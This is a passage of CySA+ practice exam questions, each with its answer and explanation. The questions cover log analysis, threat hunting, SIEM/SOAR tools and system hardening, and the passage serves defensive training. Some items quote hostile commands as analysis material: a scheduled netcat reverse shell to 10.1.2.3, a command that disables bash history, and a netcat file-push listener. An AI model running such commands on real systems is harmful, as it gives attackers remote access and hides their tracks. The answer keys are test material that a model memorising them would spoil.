        A. Since Andrea is attempting to stop external scans from gathering information about her network topology, the firewall is the best place to stop them. A well-designed ruleset can stop, or at least limit, the amount of network topology information that attackers can collect.
117.    Cormac needs to lock down a Windows workstation that has recently been scanned using Nmap on a Kali Linux–based system, with the results shown here. He knows that the workstation needs to access websites and that the system is part of a Windows domain. What ports should he allow through the system's firewall for externally initiated connections?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf010.jpg)

        1. 80, 135, 139, and 445.
        2. 80, 445, and 3389.
        3. 135, 139, and 445.
        4. No ports should be open.

        Answer:

        D. The uses described for the workstation that Cormac is securing do not require inbound access to the system on any of these ports. Web browsing and Active Directory domain membership traffic can be handled by traffic initiated by the system.
118.    Frank's team uses the following query to identify events in their threat intelligence tool. Why would this scenario be of concern to the security team?

        `select * from network-events where data.process.image.file = ‘cmd.exe’ AND data.process.parentImage.file != ‘explorer.exe’ AND data.process.action = ‘launch’`

        1. Processes other than `explorer.exe` typically do not launch command prompts.
        2. `cmd.exe` should never launch `explorer.exe`.
        3. `explorer.exe` provides administrative access to systems.
        4. `cmd.exe` runs as administrator by default when launched outside of Explorer.

        Answer:

        A. For most Windows user workstations, launches of `cmd.exe` by programs other than Explorer are not typical. This script will identify those launches and will alarm on them.
119.    Mark writes a script to pull data from his security data repository. The script includes the following query:

        `select source.name, data.process.cmd, count(*) AS hostcount from windows-events where type = ‘sysmon’ AND data.process.action = ‘launch’ AND data.process.image.file = ‘reg.exe’ AND data.process.parentImage.file = ‘cmd.exe’`

        He then queries the returned data using the following script:

        `select source.name, data.process.cmd, count(*) AS hostcount from network-events where type = ‘sysmon’ ANDdata.process.action = ‘launch’ AND data.process. image.file = ‘cmd.exe’ AND data.process.parentImage.file = ‘explorer.exe’`

        What events will Mark see?

        1. Uses of `explorer.exe` where it is launched by `cmd.exe`
        2. Registry edits launched via the command line from Explorer
        3. Registry edits launched via `explorer.exe` that modify `cmd.exe`
        4. Uses of `cmd.exe` where it is launched by `reg.exe`

        Answer:

        B. The first query will identify times when the `reg.exe` was launched by `cmd.exe`. If the same data is searched to correlate with launches of `cmd.exe` by `explorer.exe`, Mark will know when registry edits were launched via the command line (`cmd.exe`) from Explorer—a process that typically means users have edited the registry, which should be an uncommon event in most organizations and is likely to be a security concern.
120.    Mateo is responsible for hardening systems on his network, and he discovers that a number of network appliances have exposed services including telnet, FTP, and web servers. What is his best option to secure these systems?

        1. Enable host firewalls.
        2. Install patches for those services.
        3. Turn off the services for each appliance.
        4. Place a network firewall between the devices and the rest of the network.

        Answer:

        D. Mateo's only sure bet to prevent these services from being accessed is to put a network firewall in front of them. Many appliances enable services by default; since they are appliances, they may not have host firewalls available to enable. They also often don't have patches available, and many appliances do not allow the services they provide to be disabled or modified.
121.    Deepa wants to see the memory utilization for multiple Linux processes all at once. What command should she run?

        1. `top`
        2. `ls -mem`
        3. `mem`
        4. `memstat`

        Use the following scenario and image to answer questions 122–124.

        While reviewing a system she is responsible for, Amanda notices that the system is performing poorly and runs `htop` to see a graphical representation of system resource usage. She sees the information shown in the following image:

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf011.jpg)

        Answer:

        A. The `top` command provides a real-time view of the memory usage for a system on a per-process basis. The `ls` command does not work for memory; `mem` was made up for this question; and `memstat` is used to check the state of memcached servers, and it won't help in this circumstance. If you're not familiar with basic Linux commands such as `top`, you should spend some time with a Linux system as you prepare for the CySA+ exam. A basic understanding of common commands can be very helpful.
122.    What issue should Amanda report to the system administrator?

        1. High network utilization
        2. High memory utilization
        3. Insufficient swap space
        4. High CPU utilization

        Answer:

        D. This view of `htop` shows both CPU1 and CPU2 are maxed out at 100 percent. Memory is just over 60 percent used. Almost all swap space is available.
123.    What command could Amanda run to find the process with the highest CPU utilization if she did not have access to `htop`?

        1. `ps`
        2. `top`
        3. `proc`
        4. `load`

        Answer:

        B. The `top` command will show a dynamic, real-time list of running processes. If Amanda runs this, she will immediately see that two processes are consuming 99 percent of a CPU each and can see the command that ran the program.
124.    What command can Amanda use to terminate the process?

        1. `term`
        2. `stop`
        3. `end`
        4. `kill`

        Answer:

        D. The `kill` command is used to end processes in Linux. Amanda should issue the `kill -9` command followed by the process ID of the processes she wants to end (the `-9` flag is the signal and means “really try hard to kill this process”). Since she has run both `top` and `htop`, she knows that she needs to end processes 3843 and 3820 to stop stress from consuming all her resources. A little research after that will show her that stress is a stress testing application, so she may want to ask the user who ran it why they were using it if it wasn't part of their job.
125.    While reviewing output from the `netstat` command, John sees the following output. What should his next action be?

        `[minesweeper.exe] TCP 127.0.0.1:62522 dynamo:0 LISTENING [minesweeper.exe] TCP 192.168.1.100 151.101.2.69:https ESTABLISHED`

        1. Capture traffic to 151.101.2.69 using Wireshark.
        2. Initiate the organization's incident response plan.
        3. Check to see if 151.101.2.69 is a valid Microsoft address.
        4. Ignore it; this is a false positive.

        Answer:

        B. John has discovered a program that is both accepting connections and has an open connection, neither of which are typical for the Minesweeper game. Attackers often disguise Trojans as innocuous applications, so John should follow his organization's incident response plan.
126.    What does EDR use to capture data for analysis and storage in a central database?

        1. A network tap
        2. Network flows
        3. Software agents
        4. Hardware agents

        Answer:

        C. Endpoint detection and response (EDR) tools use software agents to monitor endpoint systems and to collect data about processes, user and system activity, and network traffic, which is then sent to a central processing, analysis, and storage system.
127.    While reviewing the command history for an administrative user, Lakshman discovers a suspicious command that was captured:

        `ln /dev/null ~/.bash_history`

        What action was this user attempting to perform?

        1. Enabling the Bash history
        2. Appending the contents of `/dev/null` to the Bash history
        3. Logging all shell commands to `/dev/null`
        4. Allowing remote access from the null shell

        Answer:

        C. This command will prevent commands entered at the Bash shell prompt from being logged, as they are all sent to `/dev/null`. This type of action is one reason that administrative accounts are often logged to remote hosts, preventing malicious insiders or attackers who gain administrative access from hiding their tracks.
128.    Charles wants to determine whether a message he received was forwarded by analyzing the headers of the message. How can he determine this?

        1. Reviewing the Message-ID to see if it has been incremented.
        2. Checking for the In-Reply-To field.
        3. Checking for the References field.
        4. You cannot determine if a message was forwarded by analyzing the headers.

        Answer:

        D. When an email is forwarded, a new message with a new Message-ID header will be created. The In-Reply-To and References field will also be set as normal. The best option that Charles has is to look for clues like a subject line that reads “FWD”—something that is easily changed.
129.    While reviewing the filesystem of a potentially compromised system, Marta sees the following output when running `ls -la`. What should her next action be after seeing this?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf012.jpg)

        1. Continue to search for other changes.
        2. Run `diff` against the password file.
        3. Immediately change her password.
        4. Check the `passwd` binary against a known good version.

        Answer:

        D. The `passwd` binary stands out as having recently changed. This may be innocuous, but if Marta believes the machine was compromised, there is a good chance the `passwd` binary has been replaced with a malicious version. She should check the binary against a known good version and then follow her incident response process if it doesn't match.
130.    Susan wants to check a Windows system for unusual behavior. Which of the following persistence techniques is not commonly used for legitimate purposes?

        1. Scheduled tasks
        2. Service replacement
        3. Service creation
        4. Autostart registry keys

        Answer:

        B. Scheduled tasks, service creation, and autostart registry keys are all commonly found on Windows systems for legitimate purposes. Replacing services is far less common unless a known upgrade or patch has occurred.
131.    Matt is reviewing a query that his team wrote for their threat-hunting process. What will the following query warn them about?

        ``select timeInterval(date, ‘4h’), `data.login.user`, count(distinct data.login.machine.name) as machinecount from network-events where data.winevent.EventID = 4624 having machinecount> 1``

        1. Users who log in more than once a day
        2. Users who are logged in to more than one machine within four hours
        3. Users who do not log in for more than four hours
        4. Users who do not log in to more than one machine in four hours

        Answer:

        B. Even if you don't recognize the Windows Event ID, this query provides a number of useful clues. First, it has an interval of four hours, so you know a time frame. Next, it lists `data.login.user`, which means you are likely querying user logins. Finally, it includes machine count and >1, so you can determine that it is looking for more than one system that has been logged in to. Taken together, this means that the query looks for users who have logged in to more than one machine within any given four-hour period. Matt may want to tune this to a shorter time period, because false positives may result for technical support staff, but since most users won't log in to more than one machine, this could be a very useful threat-hunting query.
132.    Ben wants to quickly check a suspect binary file for signs of its purpose or other information that it may contain. What Linux tool can quickly show him potentially useful information contained in the file?

        1. `grep`
        2. `more`
        3. `less`
        4. `strings`

        Answer:

        D. The `strings` command extracts strings of printable characters from files, allowing Ben to quickly determine the contents of files. `grep` would require knowing what he is looking for, and both `more` and `less` will simply display the file, which is often not a useful strategy for binaries.
133.    Lucas believes that an attacker has successfully compromised his web server. Using the following output of `ps`, identify the process ID he should focus on:

        `root 507 0.0 0.1 258268 3288 ? Ssl 15:52 0:00 /usr/sbin/rsyslogd -n message+ 508 0.0 0.2 44176 5160 ? Ss 15:52 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activa root 523 0.0 0.3 281092 6312 ? Ssl 15:52 0:00 /usr/lib/accountsservice/accounts-daemon root 524 0.0 0.7 389760 15956 ? Ssl 15:52 0:00 /usr/sbin/NetworkManager --no-daemon root 527 0.0 0.1 28432 2992 ? Ss 15:52 0:00 /lib/systemd/systemd-logind apache 714 0.0 0.1 27416 2748 ? Ss 15:52 0:00 /www/temp/webmin root 617 0.0 0.1 19312 2056 ? Ss 15:52 0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid root 644 0.0 0.1 245472 2444 ? Sl 15:52 0:01 /usr/sbin/VBoxService root 653 0.0 0.0 12828 1848 tty1 Ss+ 15:52 0:00 /sbin/agetty --noclear tty1 linux root 661 0.0 0.3 285428 8088 ? Ssl 15:52 0:00 /usr/lib/policykit-1/polkitd --no-debug root 663 0.0 0.3 364752 7600 ? Ssl 15:52 0:00 /usr/sbin/gdm3 root 846 0.0 0.5 285816 10884 ? Ssl 15:53 0:00 /usr/lib/upower/upowerd root 867 0.0 0.3 235180 7272 ? Sl 15:53 0:00 gdm-session-worker [pam/gdm-launch-environment] Debian-+ 877 0.0 0.2 46892 4816 ? Ss 15:53 0:00 /lib/systemd/systemd --user Debian-+ 878 0.0 0.0 62672 1596 ? S 15:53 0:00 (sd-pam)`

        1. 508
        2. 617
        3. 846
        4. 714

        Answer:

        D. The service running from the `www` directory as the user `apache` should be an immediate indication of something strange, and the use of webmin from that directory should also be a strong indicator of something wrong. Lucas should focus on the web server for the point of entry to the system and should review any files that the `apache` user has created or modified. If local vulnerabilities existed when this compromise occurred, the attacker may have already escalated to another account.
134.    Damian has discovered that systems throughout his organization have been compromised for more than a year by an attacker with significant resources and technology. After a month of attempting to fully remove the intrusion, his organization is still finding signs of compromise despite their best efforts. How would Damian best categorize this threat actor?

        1. Criminal
        2. Hacktivist
        3. APT
        4. Unknown

        Answer:

        C. Damian has likely encountered an advanced persistent threat (APT). They are characterized as extremely well-resourced actors whose compromises typically have an extended dwell time and the ability to scale capabilities to counter defenders over time.
135.    While investigating a compromise, Glenn encounters evidence that a user account has been added to the system he is reviewing. He runs a `diff` of `/etc/shadow` and `/etc/passwd` and sees the following output. What has occurred?

        `root:$6$XHxtN5iB$5WOyg3gGfzr9QHPLo.7z0XIQIzEW6Q3/K7iipxG7ue04CmelkjC51SndpOcQlxTHmW4/AKKsKew4f3cb/.BK8/:16828:0:99999:7::: > daemon:*:16820:0:99999:7::: > bin:*:16820:0:99999:7::: > sys:*:16820:0:99999:7::: > sync:*:16820:0:99999:7::: > games:*:16820:0:99999:7::: > man:*:16820:0:99999:7::: > lp:*:16820:0:99999:7::: > mail:*:16820:0:99999:7::: > news:*:16820:0:99999:7::: > uucp:*:16820:0:99999:7::: > proxy:*:16820:0:99999:7::: > www-data:*:16820:0:99999:7::: > backup:*:16820:0:99999:7::: > list:*:16820:0:99999:7::: > irc:*:16820:0:99999:7:::`

        1. The root account has been compromised.
        2. An account named `daemon` has been added.
        3. The shadow password file has been modified.
        4. `/etc/shadow` and `/etc/passwd` cannot be `diff`ed to create a useful comparison.

        Answer:

        D. Linux and Unix systems typically keep user account information stored in `/etc/passwd`, and `/etc/shadow` contains password and account expiration information. Using `diff` between the two files is not a useful strategy in this scenario.
136.    Bruce wants to integrate a security system to his SOAR. The security system provides real-time query capabilities, and Bruce wants to take advantage of this to provide up-to-the-moment data for his SOAR tool. What type of integration is best suited to this?

        1. CSV
        2. Flat file
        3. API
        4. Email

        Answer:

        C. API-based integrations allow a SOAR environment to send queries as required for the data they need. Flat files and CSVs can be useful when there is no API or when there isn't support for the API in an environment and real-time integration is not required. Email integrations can result in delays as email delivery is not done at a guaranteed speed and can require additional parsing and processing to extract information. Although it isn't in the list here, Bruce might consider a direct database connection if he was unable to use an API and wanted real-time data.
137.    Carol wants to analyze email as part of her antispam and antiphishing measures. Which of the following is least likely to show signs of phishing or other email-based attacks?

        1. The email's headers
        2. Embedded links in the email
        3. Attachments to the email
        4. The email signature block

        Answer:

        D. Although you may want to analyze the email signature block, it is not likely to contain information that will help you identify a phishing message, as the signature text may have been created by the attacker. It is important to note that the signature block refers to the information provided by the user at the end of an email message, not the use of a digital signature. You should analyze the entire body of an email for malicious links and payloads. Header data is often checked against IP reputation databases and other checks that can help limit email from spam domains and known malicious senders.
138.    Juliette wants to decrease the risk of embedded links in email. Which of the following solutions is the most common method for doing this?

        1. Removing all links in email
        2. Redirecting links in email to a proxy
        3. Scanning all email using an antimalware tool
        4. Using a DNS blackhole and IP reputation list

        Answer:

        C. The most common solution to identifying malicious embedded links in email is to use an antimalware software package to scan all emails. They typically include tools that combine IP and domain reputation lists as well as other heuristic and analytical tools to help identify malicious and unwanted links.
139.    James wants to use an automated malware signature creation tool. What type of environment do tools like this unpack and run the malware in?

        1. A sandbox
        2. A physical machine
        3. A container
        4. A DMARC

        Answer:

        A. Automated malware analysis tools use a secure and instrumented sandbox environment to unpack and run malware so that they can observe and record actions taken by the malware. This is used to perform behavioral analysis as well as to generate file fingerprints and other elements of unique malware signatures.
140.    Luis discovers the following entries in `/var/log/auth.log`. What is most likely occurring?

        `Aug 6 14:13:00 demo sshd[5279]: Failed password for root from 10.11.34.11 port 38460 ssh2 Aug 6 14:13:00 demo sshd[5275]: Failed password for root from 10.11.34.11 port 38452 ssh2 Aug 6 14:13:00 demo sshd[5284]: Failed password for root from 10.11.34.11 port 38474 ssh2 Aug 6 14:13:00 demo sshd[5272]: Failed password for root from 10.11.34.11 port 38446 ssh2 Aug 6 14:13:00 demo sshd[5276]: Failed password for root from 10.11.34.11 port 38454 ssh2 Aug 6 14:13:00 demo sshd[5273]: Failed password for root from 10.11.34.11 port 38448 ssh2 Aug 6 14:13:00 demo sshd[5271]: Failed password for root from 10.11.34.11 port 38444 ssh2 Aug 6 14:13:00 demo sshd[5280]: Failed password for root from 10.11.34.11 port 38463 ssh2 Aug 6 14:13:01 demo sshd[5302]: Failed password for root from 10.11.34.11 port 38478 ssh2 Aug 6 14:13:01 demo sshd[5301]: Failed password for root from 10.11.34.11 port 38476 ssh2`

        1. A user has forgotten their password.
        2. A brute-force attack against the root account.
        3. A misconfigured service.
        4. A denial-of-service attack against the root account.

        Answer:

        B. Repeated failures from the same host likely indicate a brute-force attack against the root account.
141.    Singh wants to prevent remote login attacks against the root account on a Linux system. What method will stop attacks like this while allowing normal users to use SSH?

        1. Add an `iptables` rule blocking root logins.
        2. Add root to the `sudoers` group.
        3. Change `sshd_config` to deny root login.
        4. Add a network IPS rule to block root logins.

        Answer:

        C. Fortunately, the `sshd` service has a configuration setting called `PermitRootLogin`. Setting it to `no` will accomplish Singh's goal.
142.    Azra's network firewall denies all inbound traffic but allows all outbound traffic. While investigating a Windows workstation, she encounters a script that runs the following command:

        `at \\workstation10 20:30 every:F nc -nv 10.1.2.3 443 -e cmd.exe`

        What does it do?

        1. It opens a reverse shell for host 10.1.2.3 using `netcat` every Friday at 8:30 p.m.
        2. It uses the `AT` command to dial a remote host via NetBIOS.
        3. It creates an HTTPS session to 10.1.2.3 every Friday at 8:30 p.m.
        4. It creates a VPN connection to 10.1.2.3 every five days at 8:30 p.m. GST.

        Answer:

        A. The `at` command can be used to schedule Windows tasks. This task starts `netcat` as a reverse shell using `cmd.exe` via port 443 every Friday at 8:30 p.m. local time. Azra should be concerned, as this allows traffic in that otherwise might be blocked.
143.    While reviewing the `auth.log` file on a Linux system she is responsible for, Tiffany discovers the following log entries:

        `Aug 6 14:13:06 demo sshd[5273]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=127.0.0.1 user=root Aug 6 14:13:06 demo sshd[5273]: PAM service(sshd) ignoring max retries; 6> 3 Aug 6 14:13:07 demo sshd[5280]: Failed password for root from 127.0.0.1 port 38463 ssh2 Aug 6 14:13:07 demo sshd[5280]: error: maximum authentication attempts exceeded for root from 127.0.0.1 port 38463 ssh2 [preauth] Aug 6 14:13:07 demo sshd[5280]: Disconnecting: Too many authentication failures [preauth]`

        Which of the following has _not_ occurred?

        1. A user has attempted to reauthenticate too many times.
        2. PAM is configured for three retries and will reject any additional retries in the same session.
        3. `Fail2ban` has blocked the SSH login attempts.
        4. Root is attempting to log in via SSH from the local host.

        Answer:

        C. This output shows a brute-force attack run against the localhost's root account using SSH. This resulted in the root user attempting to reauthenticate too many times, and PAM has blocked the retries. `Fail2ban` is not set up for this service; thus, this is the one item that has not occurred. If it was enabled, the `Fail2ban` log would read something like `2019-07-11 12:00:00,111 fail2ban.actions: WARNING [ssh] Ban 127.0.0.1`.
144.    Naomi wants to analyze malware by running it and capturing what it does. What type of tool should she use?

        1. A containerization tool
        2. A virtualization tool
        3. A sandbox tool
        4. A packet analyzer

        Answer:

        C. The best option for Naomi is a dedicated sandbox tool like Sandboxie or a cloud service sandbox like `app.run.any`. They are designed to isolate the malware while providing instrumentation to capture and analyze the results of the malware execution. Manually building a virtualization environment is a possibility but requires a lot of work to instrument and build tools to analyze the malware. A containerization tool is best suited to app deployment, and a packet analyzer is useful for looking at network traffic.
145.    While reviewing logs from users with root privileges on an administrative jump box, Alex discovers the following suspicious command:

        `nc -l -p 43501 < example.zip`

        What happened?

        1. The user set up a reverse shell running as `example.zip`.
        2. The user set up `netcat` as a listener to push `example.zip`.
        3. The user set up a remote shell running as `example.zip`.
        4. The user set up `netcat` to receive `example.zip`.

        Answer:

        B. The -`l` flag is a key hint here, indicating that `netcat` was set up as a listener. Any connection to port 43501 will result in `example.zip` being sent to the connecting application. Typically, a malicious user would then connect to that port using `netcat` from a remote system to download the file.
146.    Susan is hunting threats and performs the following query against her database of event lots. What type of threat is she looking for?

        `Select source.name, destination.name, count(*) from network-events, where destination.port = ‘3389’`

        1. SSH
        2. MySQL
        3. RDP
        4. IRC

        Answer:

        C. TCP port 3389 is the standard Microsoft Remote Desktop Protocol (RDP) port. This query would return all matches for source and destination names for all network events where the destination port was 3389—most likely a system with an accessible RDP service.
147.    Lukas wants to prevent users from running a popular game on Windows workstations he is responsible for. How can Lukas accomplish this for Windows workstations?

        1. Using application allowlisting to prevent all prohibited programs from running.
        2. Using Windows Defender and adding the game to the blocklist file.
        3. Listing it in the Blocked Programs list via `secpol.msc`.
        4. You cannot blocklist applications in Windows 10 without a third-party application.

        Answer:

        A. Windows supports application allowlisting (whitelisting). Lukas can allowlist his allowed programs and then set the default mode to Disallowed, preventing all other applications from running and thus blocking the application. This can be a bit of a maintenance hassle but can be useful for high-security environments, or those in which limiting what programs can run is critical.
148.    Ian lists the permissions for a Linux file that he believes may have been modified by an attacker. What do the permissions shown here mean?

        `-rwxrw-r&—1 chuck admingroup 1232 Feb 28 16:22 myfile.txt`

        1. User `chuck` has read and write rights to the file; the Administrators group has read, write, and execute rights; and all other users only have read rights.
        2. User `admingroup` has read rights; group `chuck` has read and write rights; and all users on the system can read, write, and execute the file.
        3. User `chuck` has read, write, and execute rights on the file. Members of `admingroup` group can read and write to the file but cannot execute it, and all users on the system can read the file.
        4. User `admingroup` has read, write, and execute rights on the file; user `chuck` has read and write rights; and all other users have read rights to the file.

        Answer:

        C. Remember that rights are read from left to right as user rights, group rights, and then world rights. Here we have read, write, and execute (`rwx`) for `chuck`, `rw` for `admingroup`, and `r` for world.
149.    While reviewing web server logs, Danielle notices the following entry. What occurred?

        `10.11.210.6 - GET /wordpress/wp-admin/theme-editor.php?file=404.php&theme= total 200`

        1. A theme was changed.
        2. A file was not found.
        3. An attempt to edit the 404 page.
        4. The 404 page was displayed.

        Answer:

        C. Attackers often use built-in editing tools that are inadvertently or purposefully exposed to edit files to inject malicious code. In this case, someone has attempted to modify the 404 file displayed by WordPress. Anybody who received a 404 error from this installation could have been exposed to malicious code inserted into the 404 page or simply a defaced 404 page.
150.    Melissa wants to deploy a tool to coordinate information from a wide range of platforms so that she can see it in a central location and then automate responses as part of security workflows. What type of tool should she deploy?

        1. UEBA
        2. SOAR
        3. SIEM
        4. MDR

        Answer:

        B. A security orchestration, automation, and response (SOAR) tool is focused on exactly what Melissa needs to do. While SIEM provides similar functionality, the key differentiator is the breadth of the platforms that SOAR tools can acquire data from, as well as the process automation capabilities they bring. User entity behavior analytics (UEBA) tools focus on behaviors rather than on a broad set of organizational data, and managed detection response (MDR) systems are used to speed up detection, rather than for compliance and orchestration.
151.    While reviewing the Wireshark packet capture shown here, Ryan notes an extended session using the ESP protocol. When he clicks the packets, he is unable to make sense of the content. What should Ryan look for on the workstation with IP address 10.0.0.1 if he investigates it in person?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf013.jpg)

        1. An encrypted RAT
        2. A VPN application
        3. A secure web browser
        4. A base64-encoded packet transfer utility

        Answer:

        B. Encapsulating Security Payload (ESP) packets are part of the IPsec protocol suite and are typically associated with a tunnel or VPN. Ryan should check for a VPN application and determine what service or system the user may have connected to.
152.    While reviewing indicators of compromise, Dustin notices that `notepad.exe` has opened a listener port on the Windows machine he is investigating. What is this an example of?

        1. Anomalous behavior
        2. Heuristic behavior
        3. Entity behavior
        4. Known-good behavior

        Answer:

        A. A desktop application that does not normally provide remote access opening a service port is an example of anomalous behavior. If a web server opened TCP/80 or TCP/443, it would be expected behavior and is likely to be known good behavior. Entity and heuristic behavior were both made up for this question.
153.    How does data enrichment differ from threat feed combination?

        1. Data enrichment is a form of threat feed combination for security insights, focuses on adding more threat feeds together for a full picture, and removes third-party data to focus on core data elements rather than adding together multiple data sources.
        2. Data enrichment uses events and nonevent information to improve security insights, instead of just combining threat information.
        3. Threat feed combination is more useful than data enrichment because of its focus on only the threats.
        4. Threat feed combination techniques are mature, and data enrichment is not ready for enterprise use.

        Answer:

        B. Data enrichment combines data from multiple sources such as directories, geolocation information, and other data sources as well as threat feeds to provide deeper and broader security insights. It is not just a form of threat feed combination, and threat feed combination is a narrower technique than data enrichment is.
154.    Which of the following capabilities is not a typical part of a SIEM system?

        1. Alerting
        2. Performance management
        3. Data aggregation
        4. Log retention

        Answer:

        B. Security information and event management (SIEM) systems typically provide alerting, event and log correlation, compliance data gathering and reporting, data and log aggregation, and data retention capabilities. This also means they can be used for forensic analysis since they should be designed to provide a secure copy of data. They do not typically provide performance management–specific capabilities.
155.    Kathleen wants to verify on a regular basis that a file has not changed on the system that she is responsible for. Which of the following methods is best suited to this?

        1. Use `sha1sum` to generate a hash for the file and write a script to check it periodically.
        2. Install and use Tripwire.
        3. Periodically check the MAC information for the file using a script.
        4. Encrypt the file and keep the key secret so the file cannot be modified.

        Answer:

        B. Tripwire and similar programs are designed to monitor files for changes and to report on changes that occur. They rely on file fingerprints (hashes) and are designed to be reliable and scalable. Kathleen's best bet is to use a tool designed for the job, rather than to try to write her own.
156.    Alaina has configured her SOAR system to detect irregularities in geographical information for logins to her organization's administrative systems. The system alarms, noting that an administrator has logged in from a location that they do not typically log in from. What other information would be most useful to correlate with this to determine if the login is a threat?

        1. Anomalies in privileged account usage
        2. Time-based login information
        3. A mobile device profile change
        4. DNS request anomalies

        Answer:

        A. In this case, if the user is logged in to administrative systems, privileged account usage would be the most useful additional detail that Alaina could have available. Time-based login information might also prove useful, but a traveling administrative user might simply be in another time zone. Mobile device profile changes and DNS request anomalies are less likely to be correlated with a remote exploit and more likely to be correlated with a compromise of a user device or malware respectively. Rank Software provides a great threat hunting playbook at [`www.osintme.com/wp-content/uploads/2022/09/Threat_Hunting_Playbook.pdf`](http://www.osintme.com/wp-content/uploads/2022/09/Threat\_Hunting\_Playbook.pdf) that may prove useful to you as you consider these threats.
157.    Megan wants to check memory utilization on a macOS-based system. What Apple tool can she use to do this?

        1. Activity Monitor
        2. MemControl
        3. Running `memstat` from the command line
        4. Running `memctl` from the command line

        Answer:

        A. macOS has a built-in memory monitoring tool as part of Activity Monitor. It will show you details, including how much memory the system has, what is used by applications and the operating system, how much space is taken up by cached files to improve system performance, how much space is used on your disk for swap space, and how efficiently your memory is being used in the form of a statistic called _memory pressure_.
158.    Fiona is considering a scenario in which components that her organization uses in its software that come from public GitHub repositories are Trojaned. What should she do first to form the basis of her proactive threat-hunting effort?

        1. Search for examples of a similar scenario.
        2. Validate the software currently in use from the repositories.
        3. Form a hypothesis.
        4. Analyze the tools available for this type of attack.

        Answer:

        C. Forming a hypothesis should be Fiona's next step. Once she starts to consider a scenario, she needs to identify the target and likely adversary techniques and determine how she would verify the hypothesis.
159.    Tracy has reviewed the CrowdStrike writeup for an APT group known as `HELIX KITTEN`, which notes that the group is known for creating “thoroughly researched and structured spear-phishing messages relevant to the interests of targeted personnel.” What types of defenses are most likely to help if she identifies `HELIX KITTEN` as a threat actor of concern for her organization?

        1. DKIM
        2. An awareness campaign
        3. Blocking all email from unknown senders
        4. SPF

        Answer:

        B. Awareness campaigns are among the most effective ways to counter spear phishing. A well-resourced APT organization will send email from legitimate email addresses, thus bypassing most DKIM and SPF defenses. Blocking email from all unknown senders is not acceptable to most organizations.
160.    Micah wants to use the data he has collected to help with his threat-hunting practice. What type of approach is best suited to using large volumes of log and analytical data?

        1. Hypothesis-driven investigation
        2. Investigation based on indicators of compromise
        3. Investigation based on indications of attack
        4. AI/ML-based investigation

        Answer:

        D. Artificial intelligence (AI) and machine learning (ML) approaches are ideal for large volumes of log and analytical data. Manual processes like hypothesis-driven investigations, or IOC- or IOA-driven investigations, can take significant amounts of time when dealing with large volumes of data.
161.    Dani wants to analyze a malware package that calls home. What should she consider before allowing the malware to “phone home”?

        1. Whether the malware may change behavior.
        2. Whether the host IP or subnet may become a target for further attacks.
        3. Attacks may be staged by the malware against other hosts.
        4. All of the above.

        Answer:

        D. Dani needs to carefully consider what could occur while she is analyzing the malware. Once it is allowed to connect to one or more remote systems, she needs to be aware that it may result in behavior changes, probes, or attacks by the attacker, or it could attack other systems once it has a network connection and can receive commands.
162.    As part of her threat-hunting activities, Olivia bundles her critical assets into groups. Why would she choose to do this?

        1. To increase the complexity of analysis
        2. To leverage the similarity of threat profiles
        3. To mix sensitivity levels
        4. To provide a consistent baseline for threats

        Answer:

        B. Bundling critical assets into groups allows similar assets to be assessed together, leveraging the similarity of their threat profiles. This makes analysis less complex, rather than more complex. Assets should be grouped by similar sensitivity levels, rather than mixed. Threats are assessed against other threats for comparison purposes, and bundling assets will not provide a baseline for them.
163.    Unusual outbound network traffic, abnormal HTML response sizes, DNS request anomalies, and mismatched ports for application traffic are all examples of what?

        1. Threat hunting
        2. SCAP
        3. Indicators of compromise
        4. Continuous threat feeds

        Answer:

        C. There are many indicators of compromise, including the ones listed in this question, as well as things such as anomalies in privileged account usage, abnormal database requests and traffic patterns, geographical and time-based anomalies in usage patterns, unexpected and abnormal traffic growth, and many others. SCAP is an automation protocol, and both threat answers are not a good fit for this list, although threat hunting and threat feeds may include details such as the type of traffic or attack information.
164.    Naomi wants to improve the detection capabilities for her security environment. A major concern for her company is the detection of insider threats. What type of technology can she deploy to help with this type of proactive threat detection?

        1. IDS
        2. UEBA
        3. SOAR
        4. SIEM

        Answer:

        B. Since Naomi is specifically concerned about an end-user driven threat in the form of insider threats, a user entity behavior analytics (UEBA) tool is her best option from the list. A UEBA system will monitor for behaviors that are atypical for users such as those that an insider threat may take. An intrusion detection system would detect anomalous network activity and attacks, whereas both SOAR and SIEM systems would be useful for centralizing data from tools such as the UEBA and IDS tools.
165.    Ling wants to use her SOAR platform to handle phishing attacks more effectively. What elements of potential phishing emails should she collect as part of her automation and workflow process to triage and assign severity indicators?

        1. Subject lines
        2. Email sender addresses
        3. Attachments
        4. All of the above

        Answer:

        D. Ling can use her SOAR system to analyze all of the common indicators of phishing emails, including subject line content, sender addresses, attachments, and headers. From there, her SOAR system can assign a severity value to the email and take appropriate action, such as testing attachments in an isolated environment or removing phishing emails from mailboxes across her organization.
166.    Isaac wants to write a script to query the BotScout forum bot blocklisting service. What data should he use to query the service based on the following image?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf014.jpg)

        1. Email address
        2. Name
        3. IP address
        4. Date

        Answer:

        C. The only consistent indicator for this bot in the list is the IP address. Isaac should write his script to validate the IP addresses of systems to see if they should be blocked.
167.    Syslog, APIs, email, STIX/TAXII, and database connections are all examples of what for a SOAR?

        1. IOCs
        2. Methods of data ingestion
        3. SCAP connections
        4. Attack vectors

        Answer:

        B. SOAR systems offer many ways to ingest data, and syslog, APIs, email, STIX/TAXII feeds, and database connections are all common ways for data to be acquired.
168.    Yaan uses multiple data sources in his security environment, adding contextual information about users from Active Directory, geolocation data, multiple threat data feeds, as well as information from other sources to improve his understanding of the security environment. What term describes this process?

        1. Data drift
        2. Threat collection
        3. Threat centralization
        4. Data enrichment

        Answer:

        D. The CySA+ Exam Outline refers to this process as data enrichment. Data enrichment can take many forms, but the basic concept is that adding and correlating multiple data sources provides a richer, more useful data environment. As you might have guessed, the remainder of the options for this question were made up.
169.    Mila is reviewing feed data from the MISP open-source threat intelligence tool and sees the following entry:

